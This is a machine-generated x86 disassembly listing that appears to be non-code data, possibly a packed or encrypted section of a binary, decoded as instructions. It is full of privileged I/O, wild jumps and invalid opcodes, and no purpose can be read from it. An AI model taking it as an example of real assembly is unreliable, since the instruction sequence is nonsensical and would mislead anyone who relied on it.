  41cacc:	loopne 0x41cab6
  41cace:	sbb    ch,BYTE PTR [eax-0x52]
  41cad1:	jb     0x41ca94
  41cad3:	push   cs
  41cad4:	nop
  41cad5:	xor    BYTE PTR [edi+0x59],0x88
  41cad9:	jl     0x41cabc
  41cadb:	pop    esp
  41cadc:	pop    edx
  41cadd:	pushf  
  41cade:	mov    DWORD PTR [ecx],ecx
  41cae0:	mov    esi,0xd09f936a
  41cae5:	xor    eax,0x818e3ce0
  41caea:	out    dx,al
  41caeb:	mov    eax,0x18b69b62
  41caf0:	ret    0xbf3b
  41caf3:	adc    ebx,DWORD PTR ds:0x66b4895e
  41caf9:	adc    eax,0x12709d81
  41cafe:	test   DWORD PTR [ebx],0xd6bbd4a
  41cb04:	jle    0x41cae5
  41cb06:	mov    al,ds:0xd3400662
  41cb0b:	dec    ebp
  41cb0c:	retf   
  41cb0d:	push   ebx
  41cb0e:	jo     0x41cb5d
  41cb10:	ret    
  41cb11:	xor    ch,BYTE PTR [edx-0x1d3b4576]
  41cb17:	sahf   
  41cb18:	and    ebp,edx
  41cb1a:	mov    al,BYTE PTR [ebx-0x34]
  41cb1d:	das    
  41cb1e:	mov    bh,0x27
  41cb20:	aad    0x23
  41cb22:	pop    edx
  41cb23:	adc    BYTE PTR [edi+ebx*4+0x1ce36f90],dh
  41cb2a:	mov    ah,dl
  41cb2c:	xchg   esi,eax
  41cb2d:	jns    0x41cbac
  41cb2f:	out    dx,al
  41cb30:	push   esp
  41cb31:	sub    DWORD PTR ds:0x5502fa27,esi
  41cb37:	add    al,0xe8
  41cb39:	in     eax,0x40
  41cb3b:	jbe    0x41cb81
  41cb3d:	jae    0x41cb59
  41cb3f:	or     DWORD PTR [ebp+0x70],edi
  41cb42:	jmp    0xa60cb47
  41cb47:	sbb    dh,BYTE PTR [eax]
  41cb49:	jns    0x41cb80
  41cb4b:	arpl   WORD PTR [edi-0x7d2ffb65],sp
  41cb51:	das    
  41cb52:	inc    eax
  41cb53:	call   0x80bd:0x1149371d
  41cb5a:	in     al,0xd5
  41cb5c:	call   0xaf83:0x7cc36131
  41cb63:	popa   
  41cb64:	les    edx,FWORD PTR [ebp-0x3a]
  41cb67:	mov    eax,0x2e4332fb
  41cb6c:	pop    edi
  41cb6d:	mov    ebx,0x152715cd
  41cb72:	loop   0x41cb07
  41cb74:	xchg   edx,eax
  41cb75:	inc    ecx
  41cb76:	lahf   
  41cb77:	cmp    al,0xfe
  41cb79:	or     cx,dx
  41cb7c:	jnp    0x41cbbe
  41cb7e:	cwde   
  41cb7f:	cld    
  41cb80:	add    dl,BYTE PTR [eax+0x17]
  41cb83:	fisttp QWORD PTR [eax+0x78d18e00]
  41cb89:	stos   DWORD PTR es:[edi],eax
  41cb8a:	mov    al,ds:0xe70dd467
  41cb8f:	push   0xffffffe8
  41cb91:	loop   0x41cb78
  41cb93:	repnz cmp al,0x2c
  41cb96:	pop    ss
  41cb97:	lods   eax,DWORD PTR ds:[esi]
  41cb98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb99:	aam    0x3e
  41cb9b:	call   0xf1563e49
  41cba0:	les    eax,FWORD PTR [edx-0x7d]
  41cba3:	mov    ecx,0xe39fc580
  41cba8:	stos   BYTE PTR es:[edi],al
  41cba9:	ret    
  41cbaa:	jle    0x41cbe1
  41cbac:	or     eax,0x42c92818
  41cbb1:	inc    edi
  41cbb2:	cmp    al,cl
  41cbb4:	pop    ds
  41cbb5:	in     eax,dx
  41cbb6:	pop    esi
  41cbb7:	and    ebp,ecx
  41cbb9:	jns    0x41cbd3
  41cbbb:	mov    cl,BYTE PTR [ecx-0x16]
  41cbbe:	and    al,bl
  41cbc0:	loopne 0x41cc20
  41cbc2:	nop
  41cbc3:	cmp    eax,0x303d11e5
  41cbc8:	and    dl,BYTE PTR [esi]
  41cbca:	sub    eax,0xa7821b74
  41cbcf:	add    cl,BYTE PTR [esi]
  41cbd1:	ret    
  41cbd2:	mov    dh,0x27
  41cbd4:	enter  0xfcd9,0x5f
  41cbd8:	lahf   
  41cbd9:	adc    al,0x87
  41cbdb:	mov    esi,0x1ad050d4
  41cbe0:	sub    eax,0x7d7c7afc
  41cbe5:	pop    ebp
  41cbe6:	loopne 0x41cbf1
  41cbe8:	jle    0x41cbaa
  41cbea:	push   eax
  41cbeb:	int3   
  41cbec:	dec    eax
  41cbed:	leave  
  41cbee:	sti    
  41cbef:	in     eax,dx
  41cbf0:	shr    BYTE PTR [esi+edi*4],cl
  41cbf3:	sub    BYTE PTR [eax],ah
  41cbf5:	inc    ebx
  41cbf6:	int    0xc
  41cbf8:	cmp    BYTE PTR [ebx+0x58],0x54
  41cbfc:	ja     0x41cb82
  41cbfe:	fdivr  DWORD PTR [edi+0x56]
  41cc01:	dec    ebx
  41cc02:	jmp    0x5d61cdf7
  41cc07:	mov    BYTE PTR [eax-0xe],bh
  41cc0a:	fcomp  DWORD PTR [ecx]
  41cc0c:	cmp    DWORD PTR [esi+0x55],0x32c01e72
  41cc13:	or     DWORD PTR [eax+eax*2],0xd66a2cc7
  41cc1a:	push   cs
  41cc1b:	mov    esp,0x550aa3e
  41cc20:	sbb    eax,0xb31a0ef2
  41cc25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc26:	and    eax,DWORD PTR [ebx+0x36]
  41cc29:	imul   esp,DWORD PTR [ebx+edx*4+0x12],0xffffffd5
  41cc2e:	dec    esi
  41cc2f:	jns    0x41cc04
  41cc31:	mov    ecx,0xc5c3734
  41cc36:	push   ds
  41cc37:	adc    ecx,esp
  41cc39:	push   ebx
  41cc3a:	xchg   ebx,eax
  41cc3b:	dec    ebp
  41cc3c:	out    dx,al
  41cc3d:	js     0x41cc47
  41cc3f:	mov    BYTE PTR [esi+0x7fe9e6e1],bl
  41cc45:	clc    
  41cc46:	js     0x41cbfc
  41cc48:	in     al,0x6
  41cc4a:	pop    edx
  41cc4b:	loopne 0x41cc6f
  41cc4d:	mov    esi,0x878069cc
  41cc52:	push   ebx
  41cc53:	js     0x41cc35
  41cc55:	sub    edi,esp
  41cc57:	mov    esp,0xb5854bd9
  41cc5c:	sbb    al,0xed
  41cc5e:	add    DWORD PTR [esi+ebp*4+0x24],esi
  41cc62:	mov    ch,0x1d
  41cc64:	xlat   BYTE PTR ds:[ebx]
  41cc65:	dec    edx
  41cc66:	sbb    BYTE PTR [edi],ch
  41cc68:	mov    esi,0xa9e5f22
  41cc6d:	retf   
  41cc6e:	fild   DWORD PTR [ebx]
  41cc70:	sbb    eax,0xdb1920d0
  41cc75:	jge    0x41cc18
  41cc77:	fs xor eax,0xe1029017
  41cc7d:	inc    ecx
  41cc7e:	push   edi
  41cc7f:	add    ebx,DWORD PTR [ebp+0x670c32d5]
  41cc85:	and    BYTE PTR [edx],ah
  41cc87:	dec    ebx
  41cc88:	sti    
  41cc89:	sar    DWORD PTR [ebx-0x7fcceef6],0x75
  41cc90:	pop    ebp
  41cc91:	mov    esp,0x5fee7795
  41cc96:	push   ss
  41cc97:	dec    ebp
  41cc98:	into   
  41cc99:	xor    al,0x0
	...
  41cd13:	add    al,ch
  41cd15:	shl    BYTE PTR [edi+0x76],1
  41cd18:	jg     0x41cd11
  41cd1a:	stc    
  41cd1b:	ficom  WORD PTR [ebp+0x2e]
  41cd1e:	inc    esp
  41cd1f:	and    al,0xf5
  41cd21:	jbe    0x41cca7
  41cd23:	cmp    edi,DWORD PTR [edi]
  41cd25:	push   0x1
  41cd27:	add    BYTE PTR [esi+0x7],ch
  41cd2a:	add    BYTE PTR [eax],al
  41cd2c:	loopne 0x41cda0
  41cd2e:	xchg   DWORD PTR [ecx+0x66f6c75b],eax
  41cd34:	ja     0x41cd13
  41cd36:	adc    DWORD PTR [ecx],0x66
  41cd39:	mov    bh,0x3
  41cd3b:	lods   eax,DWORD PTR ds:[esi]
  41cd3c:	push   esp
  41cd3d:	fwait
  41cd3e:	std    
  41cd3f:	cmp    BYTE PTR [ecx],0xb8
  41cd42:	xor    eax,0xa2726d52
  41cd47:	bound  ebx,QWORD PTR [ebx-0x2bc3ef6]
  41cd4d:	int3   
  41cd4e:	in     al,0xdf
  41cd50:	retf   0x1077
  41cd53:	cmp    al,0x69
  41cd55:	or     al,0xe9
  41cd57:	addr16 push es
  41cd59:	mov    ds:0x347c65b2,eax
  41cd5e:	sti    
  41cd5f:	ins    BYTE PTR es:[edi],dx
  41cd60:	add    DWORD PTR [edi+0x97bafee],esi
  41cd66:	fisttp DWORD PTR [edi+0x1cad9d9d]
  41cd6c:	repz add dl,BYTE PTR ds:0x16f5295d
  41cd73:	adc    eax,0x612f1ef8
  41cd78:	jns    0x41cd69
  41cd7a:	in     al,dx
  41cd7b:	ds stos BYTE PTR es:[edi],al
  41cd7d:	cwde   
  41cd7e:	data16 mov ah,al
  41cd81:	jmp    0x646ba962
  41cd86:	(bad)  
  41cd87:	mov    al,0x46
  41cd89:	sub    al,0xbf
  41cd8b:	jle    0x41cdd7
  41cd8d:	mov    ds:0xaedd7e6e,eax
  41cd92:	push   ds
  41cd93:	daa    
  41cd94:	pop    ebp
  41cd95:	mov    eax,0xdb3d65fc
  41cd9a:	pusha  
  41cd9b:	in     eax,0x8f
  41cd9d:	imul   ebx,DWORD PTR [ebp-0x25582cdc],0x52
  41cda4:	dec    ecx
  41cda5:	out    dx,eax
  41cda6:	aaa    
  41cda7:	push   ebp
  41cda8:	daa    
  41cda9:	shr    cl,0x60
  41cdac:	add    ebp,DWORD PTR [ebx]
  41cdae:	leave  
  41cdaf:	push   ebx
  41cdb0:	rcr    dl,0x87
  41cdb3:	fwait
  41cdb4:	push   eax
  41cdb5:	cld    
  41cdb6:	xchg   BYTE PTR [edi+0x75284491],al
  41cdbc:	aad    0x2
  41cdbe:	addr16 xchg esi,eax
  41cdc0:	mov    bl,BYTE PTR [ebx-0x57]
  41cdc3:	aaa    
  41cdc4:	push   eax
  41cdc5:	mov    eax,DWORD PTR [edx]
  41cdc7:	imul   esp,esp,0xffffff9c
  41cdca:	pop    ecx
  41cdcb:	dec    edx
  41cdcc:	leave  
  41cdcd:	mov    ds,WORD PTR [edi+ecx*4+0x17d4050d]
  41cdd4:	int    0x8a
  41cdd6:	mov    ds,edi
  41cdd8:	bound  esi,QWORD PTR [esi+0x2c]
  41cddb:	mov    ch,0xbf
  41cddd:	mov    ah,0xd9
  41cddf:	test   al,0x74
  41cde1:	push   0x85f128fa
  41cde6:	dec    esi
  41cde7:	stc    
  41cde8:	loope  0x41cd87
  41cdea:	out    dx,eax
  41cdeb:	rcr    DWORD PTR [ecx-0x3977d8a],1
  41cdf1:	mov    bl,dl
  41cdf3:	mov    BYTE PTR [ebx+0x2595cfc2],bh
  41cdf9:	std    
  41cdfa:	in     al,dx
  41cdfb:	push   ds
  41cdfc:	adc    edi,DWORD PTR [eax+0x6be37a84]
  41ce02:	inc    bx
  41ce04:	stos   DWORD PTR es:[edi],eax
  41ce05:	dec    eax
  41ce06:	xchg   ecx,eax
  41ce07:	cdq    
  41ce08:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0a:	data16 mov bh,0x9d
  41ce0d:	ins    DWORD PTR es:[edi],dx
  41ce0e:	popa   
  41ce0f:	paddsw mm4,QWORD PTR [ecx-0x43c70e79]
  41ce16:	cmp    dl,BYTE PTR [ebx-0x32]
  41ce19:	pop    es
  41ce1a:	inc    ebx
  41ce1b:	xchg   cl,cl
  41ce1d:	enter  0xd2ab,0x54
  41ce21:	inc    ebp
  41ce22:	inc    esp
  41ce23:	les    ebp,FWORD PTR [ebp+0x28c9c19]
  41ce29:	adc    eax,0xd0108445
  41ce2e:	sub    DWORD PTR ds:0x35af5d28,ebp
  41ce34:	mov    cl,0xab
  41ce36:	jae    0x41ce56
  41ce38:	xchg   edx,eax
  41ce39:	and    ebp,DWORD PTR [ebx+0x7dd1190c]
  41ce3f:	mov    ds:0xfa46ecda,eax
  41ce44:	jmp    0x4ef34f14
  41ce49:	mov    dh,BYTE PTR ds:0x8db461a8
  41ce4f:	in     eax,0xc3
  41ce51:	lea    eax,[esi+edx*1]
  41ce54:	loopne 0x41cde8
  41ce56:	(bad)  
  41ce57:	call   0xd18a:0x121b3f4f
  41ce5e:	or     esp,DWORD PTR [edx-0x11eeee53]
  41ce64:	out    dx,al
  41ce65:	imul   ebx,edi,0x1e
  41ce68:	xchg   esp,eax
  41ce69:	pusha  
  41ce6a:	pop    ebx
  41ce6b:	retf   
  41ce6c:	dec    esi
  41ce6d:	ret    
  41ce6e:	xchg   esi,eax
  41ce6f:	push   ss
  41ce70:	ja     0x41ce38
  41ce72:	mov    ebp,0xaa69ebf8
  41ce77:	faddp  st(0),st
  41ce79:	stos   DWORD PTR es:[edi],eax
  41ce7a:	sbb    ebx,DWORD PTR [edi-0x8158d2f]
  41ce80:	jl     0x41ce2f
  41ce82:	jmp    0x81c619a5
  41ce87:	dec    ebp
  41ce88:	jg     0x41ceae
  41ce8a:	sbb    ebp,eax
  41ce8c:	pop    ecx
  41ce8d:	fsubr  DWORD PTR [edi+ebp*1+0x66af5ffe]
  41ce94:	das    
  41ce95:	lods   eax,DWORD PTR ds:[esi]
  41ce96:	push   ss
  41ce97:	jno    0x41cef4
  41ce99:	inc    esp
  41ce9a:	aad    0xb1
  41ce9c:	daa    
  41ce9d:	xor    ecx,DWORD PTR [ebx-0x10]
  41cea0:	jmp    FWORD PTR [eax-0x11]
  41cea3:	sbb    BYTE PTR [ebx-0x15],cl
  41cea6:	mov    WORD PTR [ebx-0x4c],es
  41cea9:	or     bl,cl
  41ceab:	mov    edx,DWORD PTR [esi+ebp*8-0x28]
  41ceaf:	leave  
  41ceb0:	dec    edi
  41ceb1:	dec    edi
  41ceb2:	push   es
  41ceb3:	shl    BYTE PTR [esi+0x5cdee9f9],1
  41ceb9:	stos   BYTE PTR es:[edi],al
  41ceba:	pop    ebx
  41cebb:	or     eax,0x49ae9bed
  41cec0:	pop    esi
  41cec1:	adc    cl,BYTE PTR [edx]
  41cec3:	int    0xc
  41cec5:	jge    0x41cf3b
  41cec7:	or     dh,BYTE PTR [edx]
  41cec9:	xchg   ebp,eax
  41ceca:	mov    ch,0x48
  41cecc:	ins    BYTE PTR es:[edi],dx
  41cecd:	scas   al,BYTE PTR es:[edi]
  41cece:	mov    ?,WORD PTR [edx-0x7e]
  41ced1:	xchg   edi,eax
  41ced2:	inc    eax
  41ced3:	jecxz  0x41cf15
  41ced5:	nop
  41ced6:	jp     0x41ceee
  41ced8:	fs push es
  41ceda:	retf   
  41cedb:	cmp    BYTE PTR [eax+edx*4-0x40],al
  41cedf:	inc    esi
  41cee0:	inc    ecx
  41cee1:	adc    esp,0xffffffd6
  41cee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee5:	xlat   BYTE PTR ds:[ebx]
  41cee6:	les    edx,FWORD PTR [edx+eiz*2]
  41cee9:	push   edx
  41ceea:	cmc    
  41ceeb:	ret    
  41ceec:	fcom   st(6)
  41ceee:	pop    ebp
  41ceef:	ins    DWORD PTR es:[edi],dx
  41cef0:	adc    BYTE PTR [esi+0x712d86a1],bh
  41cef6:	and    eax,DWORD PTR [ecx]
  41cef8:	cwde   
  41cef9:	adc    al,0xf5
  41cefb:	psraw  mm1,mm1
  41cefe:	xor    BYTE PTR [eax+0x122e1582],0x8
  41cf05:	jbe    0x41cf06
  41cf07:	pop    es
  41cf08:	mov    eax,ds:0x68d22ea8
  41cf0d:	fld    DWORD PTR [ebx+0x7c8d76c9]
  41cf13:	jle    0x41cf57
  41cf15:	aam    0x6a
  41cf17:	sub    ah,BYTE PTR ds:0xcf2f6192
  41cf1d:	mov    DWORD PTR [ecx],0xdf02f0fd
  41cf23:	enter  0x278b,0x42
  41cf27:	and    BYTE PTR [eax-0x2217b657],dl
  41cf2d:	mov    eax,0xdc3abebd
  41cf32:	sub    al,0xfb
  41cf34:	call   0xfac2:0xe22b1b9b
  41cf3b:	ret    
  41cf3c:	mov    ebx,DWORD PTR [esi]
  41cf3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf3f:	sbb    DWORD PTR [ebp+0x31546ee0],eax
  41cf45:	ret    0x563e
  41cf48:	popa   
  41cf49:	test   eax,0xc8c43826
  41cf4e:	cs ins DWORD PTR es:[edi],dx
  41cf50:	into   
  41cf51:	or     al,0xd9
  41cf53:	push   ss
  41cf54:	xor    al,0xc8
  41cf56:	jge    0x41cfc5
  41cf58:	push   edi
  41cf59:	ret    0x65a8
  41cf5c:	sbb    eax,0x98296a13
  41cf61:	push   es
  41cf62:	int3   
  41cf63:	dec    ecx
  41cf64:	fdivr  QWORD PTR [eax+0x5b61d415]
  41cf6a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41cf6c:	(bad)  
  41cf6d:	lods   al,BYTE PTR ds:[esi]
  41cf6e:	jge    0x41cf1f
  41cf70:	loopne 0x41cfd7
  41cf72:	sti    
  41cf73:	shl    DWORD PTR ds:0x172583a,1
  41cf79:	mov    dl,0x9c
  41cf7b:	dec    edi
  41cf7c:	lods   al,BYTE PTR ds:[esi]
  41cf7d:	sbb    edi,DWORD PTR [esi+0x48b283f6]
  41cf83:	(bad)  
  41cf84:	sbb    esi,esi
  41cf86:	icebp  
  41cf87:	push   0xffffff98
  41cf89:	cmc    
  41cf8a:	fisub  WORD PTR [ecx-0x5a]
  41cf8d:	mov    ds:0x3414c321,al
  41cf92:	xchg   edi,eax
  41cf93:	cdq    
  41cf94:	scas   eax,DWORD PTR es:[edi]
  41cf95:	jecxz  0x41cfe7
  41cf97:	aam    0x59
  41cf99:	or     cl,bl
  41cf9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf9c:	not    DWORD PTR [eax-0x2b]
  41cf9f:	adc    DWORD PTR [eax+0x33837d40],0x7c910adb
  41cfa9:	sub    cl,cl
  41cfab:	or     DWORD PTR [ebp-0x24],ecx
  41cfae:	or     esp,esp
  41cfb0:	pop    ss
  41cfb1:	mov    ebx,eax
  41cfb3:	or     al,0x5c
  41cfb5:	int3   
  41cfb6:	cld    
  41cfb7:	cmc    
  41cfb8:	jne    0x41cf63
  41cfba:	stc    
  41cfbb:	fidivr WORD PTR [esi-0x31]
  41cfbe:	sbb    ch,cl
  41cfc0:	and    bl,BYTE PTR [esi-0x1042f3a8]
  41cfc6:	gs out 0x63,eax
  41cfc9:	push   edi
  41cfca:	mov    edi,0xc0001a05
  41cfcf:	inc    ecx
  41cfd0:	invd   
  41cfd2:	call   0xb0a7a8a1
  41cfd7:	push   ds
  41cfd8:	outs   dx,DWORD PTR ds:[esi]
  41cfd9:	xor    eax,0x4e18b7a9
  41cfde:	stos   BYTE PTR es:[edi],al
  41cfdf:	(bad)  
  41cfe0:	test   eax,0x1e5b3913
  41cfe5:	loope  0x41d049
  41cfe7:	mov    ch,0x60
  41cfe9:	ins    BYTE PTR es:[edi],dx
  41cfea:	sub    eax,0xccc393d4
  41cfef:	jno    0x41cf71
  41cff1:	jecxz  0x41d016
  41cff3:	popf   
  41cff4:	adc    eax,DWORD PTR [edx+0x51]
  41cff7:	push   eax
  41cff8:	push   ss
  41cff9:	cmp    BYTE PTR [edx+esi*2+0x1f],cl
  41cffd:	in     eax,dx
  41cffe:	pusha  
  41cfff:	mov    edx,DWORD PTR [edi]
  41d001:	jo     0x41d04a
  41d003:	and    DWORD PTR [esi-0x5e60d27d],ebx
  41d009:	mov    ch,dh
  41d00b:	stc    
  41d00c:	xor    eax,0x982df4d9
  41d011:	sbb    dh,BYTE PTR [ecx-0x24795758]
  41d017:	inc    edi
  41d018:	xor    eax,0xb19d82f7
  41d01d:	and    al,0xff
  41d01f:	hlt    
  41d020:	mov    esp,0xac1c9c7d
  41d025:	jne    0x41d09f
  41d027:	sbb    dl,ch
  41d029:	not    bl
  41d02b:	lock push esp
  41d02d:	pop    ebx
  41d02e:	sub    al,BYTE PTR [esi+0x7f]
  41d031:	jg     0x41cfc4
  41d033:	pusha  
  41d034:	loop   0x41cffe
  41d036:	jo     0x41d056
  41d038:	and    eax,0xda6e5c8e
  41d03d:	xchg   esi,eax
  41d03e:	push   esp
  41d03f:	mov    WORD PTR [ecx],?
  41d041:	or     BYTE PTR [edx],dh
  41d043:	aaa    
  41d044:	cli    
  41d045:	ret    0xfb3e
  41d048:	mov    eax,ds:0xd3a8a163
  41d04d:	aad    0x3c
  41d04f:	int    0x91
  41d051:	inc    ebp
  41d052:	cmp    dh,bl
  41d054:	xchg   esi,eax
  41d055:	pop    ebx
  41d056:	pand   mm2,QWORD PTR [esi+edi*1+0x2f37011c]
  41d05e:	mov    dh,BYTE PTR [ebp+0x7a]
  41d061:	mov    ds:0x5eb64225,eax
  41d066:	add    eax,0xc470f4bd
  41d06b:	jle    0x41d036
  41d06d:	mov    cl,0x35
  41d06f:	jae    0x41d055
  41d071:	imul   esi,DWORD PTR [edi-0x664daa85],0x1b
  41d078:	cs cs into 
  41d07b:	push   ss
  41d07c:	mov    bl,0xb7
  41d07e:	scas   al,BYTE PTR es:[edi]
  41d07f:	push   eax
  41d080:	adc    eax,0x69d61ee0
  41d085:	inc    edi
  41d086:	(bad)  [edi-0x21533096]
  41d08c:	nop
  41d08d:	aam    0xa7
  41d08f:	test   DWORD PTR [esi],edi
  41d091:	ja     0x41d047
  41d093:	loope  0x41d095
  41d095:	mov    eax,0xcb01268b
  41d09a:	jl     0x41d10f
  41d09c:	pop    eax
  41d09d:	mov    esi,0xf380616b
  41d0a2:	(bad)  
  41d0a4:	stos   DWORD PTR es:[edi],eax
  41d0a5:	mov    edx,0x140f5f27
  41d0aa:	aam    0x43
  41d0ac:	test   al,0x42
  41d0ae:	inc    esp
  41d0af:	jmp    0x7b5a:0x4618cfdb
  41d0b6:	jp     0x41d102
  41d0b8:	mov    ds:0x6cb6d9cb,eax
  41d0bd:	mov    eax,ds:0xed8a62dd
  41d0c2:	aas    
  41d0c3:	outs   dx,BYTE PTR ds:[esi]
  41d0c4:	dec    esp
  41d0c5:	fcom   QWORD PTR ds:0xfc38d847
  41d0cb:	push   DWORD PTR [ecx+0x77]
  41d0ce:	mov    edi,0x69f8f8ac
  41d0d3:	in     eax,0xe2
  41d0d5:	mov    al,0xbb
  41d0d7:	rcr    BYTE PTR [ebx+edx*8+0x35],1
  41d0db:	inc    edi
  41d0dc:	rol    BYTE PTR [eax+0x6373f17a],1
  41d0e2:	adc    BYTE PTR [ebp+0x6cef5135],bh
  41d0e8:	dec    cx
  41d0ea:	pushaw 
  41d0ec:	inc    edi
  41d0ed:	into   
  41d0ee:	fdiv   QWORD PTR [ebp+0x39]
  41d0f1:	jp     0x41d16c
  41d0f3:	or     eax,0xe5b3da2f
  41d0f8:	jg     0x41d164
  41d0fa:	pop    edi
  41d0fb:	int3   
  41d0fc:	out    0x6a,al
  41d0fe:	popa   
  41d0ff:	push   cx
  41d101:	jbe    0x41d125
  41d103:	jg     0x41d0b4
  41d105:	shr    BYTE PTR [edx],1
  41d107:	adc    eax,0x7cd338b5
  41d10c:	adc    DWORD PTR [edi],esp
  41d10e:	into   
  41d10f:	retf   
  41d110:	or     DWORD PTR [ecx+0x6302d439],esi
  41d116:	into   
  41d117:	js     0x41d167
  41d119:	xor    bl,BYTE PTR [ebx-0x1c16ffce]
  41d11f:	add    DWORD PTR [edx+0x67],ecx
  41d122:	fisub  DWORD PTR [ebx+0x4845e319]
  41d128:	jnp    0x41d11d
  41d12a:	push   cs
  41d12b:	bound  edx,QWORD PTR ds:0x7cd14e64
  41d131:	jae    0x41d119
  41d133:	push   0x63
  41d135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d136:	arpl   WORD PTR [edx],dx
  41d138:	push   es
  41d139:	test   al,0x0
  41d13b:	sbb    BYTE PTR [esi],bl
  41d13d:	fmul   QWORD PTR [eax+0xb]
  41d140:	shl    DWORD PTR [ecx+0x3b426694],cl
  41d146:	sub    DWORD PTR [eax-0x18],ebx
  41d149:	xchg   ebx,eax
  41d14a:	push   eax
  41d14b:	stc    
  41d14c:	mov    eax,ds:0x493fe7e4
  41d151:	jb     0x41d13e
  41d153:	rcl    esp,1
  41d155:	mov    ebp,0x6864c533
  41d15a:	pop    esp
  41d15b:	xor    al,0x2a
  41d15d:	je     0x41d11a
  41d15f:	das    
  41d160:	mov    edx,0x7f61361f
  41d165:	inc    esi
  41d166:	addr16 adc al,0x8a
  41d169:	xlat   BYTE PTR ds:[ebx]
  41d16a:	scas   eax,DWORD PTR es:[edi]
  41d16b:	call   0xd3e20884
  41d170:	sub    eax,0x88da0d18
  41d175:	sub    ah,cl
  41d177:	addr16 dec esp
  41d179:	fwait
  41d17a:	mov    al,ds:0xdb7d86d2
  41d17f:	mov    ecx,0xb1f85b37
  41d184:	stos   BYTE PTR es:[edi],al
  41d185:	int3   
  41d186:	mov    bl,0xcb
  41d188:	lds    eax,FWORD PTR [ebp+0x11]
  41d18b:	pop    ebp
  41d18c:	iret   
  41d18d:	xor    al,0xda
  41d18f:	sbb    BYTE PTR [edx],0x67
  41d192:	mov    al,ds:0xb9b08b5a
  41d197:	ja     0x41d13b
  41d199:	jno    0x41d1a9
  41d19b:	std    
  41d19c:	add    ebx,DWORD PTR [edx+0x193cc7b2]
  41d1a2:	nop
  41d1a3:	fdivrp st(0),st
  41d1a5:	inc    edx
  41d1a6:	xchg   esi,eax
  41d1a7:	ja     0x41d1fb
  41d1a9:	pop    eax
  41d1aa:	and    eax,ebp
  41d1ac:	ins    DWORD PTR es:[edi],dx
  41d1ad:	add    eax,0x60334f31
  41d1b2:	dec    ecx
  41d1b3:	push   eax
  41d1b4:	cld    
  41d1b5:	fistp  WORD PTR [ebp+0x3d950caa]
  41d1bb:	loope  0x41d18e
  41d1bd:	cmp    eax,0x2647de94
  41d1c2:	jnp    0x41d1e1
  41d1c4:	in     eax,0x47
  41d1c6:	sar    ecx,1
  41d1c8:	and    al,0xdb
  41d1ca:	push   esi
  41d1cb:	xchg   bl,dh
  41d1cd:	mov    edx,0x981f765d
  41d1d2:	pop    ss
  41d1d3:	xchg   edi,eax
  41d1d4:	aas    
  41d1d5:	es xchg esi,eax
  41d1d7:	push   esi
  41d1d8:	jmp    DWORD PTR [edx+0x73]
  41d1db:	shl    DWORD PTR [eax+0x2ddd1ef0],1
  41d1e1:	and    BYTE PTR [ecx],cl
  41d1e3:	shl    al,cl
  41d1e5:	popf   
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [ebp+0x3e],bl
  41d1ea:	shl    DWORD PTR [ebp+0x26],0x98
  41d1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1ef:	cwde   
  41d1f0:	shl    BYTE PTR [ebx],cl
  41d1f2:	jae    0x41d267
  41d1f4:	out    dx,al
  41d1f5:	nop
  41d1f6:	or     ecx,DWORD PTR [esi]
  41d1f8:	imul   edx,DWORD PTR [edx],0x6c
  41d1fb:	pop    ds
  41d1fc:	and    DWORD PTR [ecx],edi
  41d1fe:	fsubr  DWORD PTR [edi]
  41d200:	fcomp  DWORD PTR [eax+0x264465eb]
  41d206:	mov    cl,0x8a
  41d208:	pushf  
  41d209:	leave  
  41d20a:	das    
  41d20b:	mov    dh,dl
  41d20d:	add    BYTE PTR [edx+ebx*8],bh
  41d210:	imul   esi,DWORD PTR es:[ebp+0x37d63166],0xf6a37a74
  41d21b:	add    dl,BYTE PTR [edi-0x5]
  41d21e:	sbb    DWORD PTR [ecx],edx
  41d220:	aas    
  41d221:	addr16 cdq 
  41d223:	mov    eax,ds:0xe6e75be6
  41d228:	fwait
  41d229:	or     al,0xc7
  41d22b:	call   0x6103:0x6a9d9108
  41d232:	mov    ebx,edi
  41d234:	test   al,0x37
  41d236:	stos   BYTE PTR es:[edi],al
  41d237:	fmul   DWORD PTR [eax]
  41d239:	mov    eax,ds:0x9ac46295
  41d23e:	jle    0x41d2b0
  41d240:	retf   0x8af9
  41d243:	or     bh,BYTE PTR [ebx]
  41d245:	mov    edx,0xa765ca5e
  41d24a:	jae    0x41d26b
  41d24c:	push   ss
  41d24d:	mov    fs,WORD PTR [edi+0x69]
  41d250:	outs   dx,BYTE PTR ds:[esi]
  41d251:	push   cs
  41d252:	inc    eax
  41d253:	inc    esi
  41d254:	pop    ebx
  41d255:	pop    esi
  41d256:	and    ebp,0x76
  41d259:	into   
  41d25a:	mov    al,ds:0xa30711d
  41d25f:	test   al,0xde
  41d261:	push   ss
  41d262:	mov    ebp,0x1abf9f86
  41d267:	jo     0x41d233
  41d269:	sar    ecx,cl
  41d26b:	push   esp
  41d26c:	or     DWORD PTR [esi],edi
  41d26e:	shr    DWORD PTR [edx],cl
  41d270:	lods   al,BYTE PTR ds:[esi]
  41d271:	add    DWORD PTR [ecx-0x77799930],ebx
  41d277:	add    BYTE PTR [ecx],dh
  41d279:	iret   
  41d27a:	rcr    BYTE PTR [edi-0x46],0x73
  41d27e:	inc    esp
  41d27f:	out    0x3e,eax
  41d281:	mov    edi,0xfa27328
  41d286:	xadd   BYTE PTR [eax],bl
  41d289:	ja     0x596f3d2f
  41d28f:	out    dx,eax
  41d290:	les    ebx,FWORD PTR [eax+0x1f]
  41d293:	mov    esi,0x8f75a706
  41d298:	add    DWORD PTR [ecx],esp
  41d29a:	push   0x3bdf2c80
  41d29f:	outs   dx,BYTE PTR ds:[esi]
  41d2a0:	sbb    eax,0x1af255b8
  41d2a5:	xor    BYTE PTR [ecx],al
  41d2a7:	imul   eax,esp,0x3c
  41d2aa:	and    eax,0x23ecf27a
  41d2af:	bound  ebx,QWORD PTR [esi]
  41d2b1:	mov    bl,0xe5
  41d2b3:	in     eax,dx
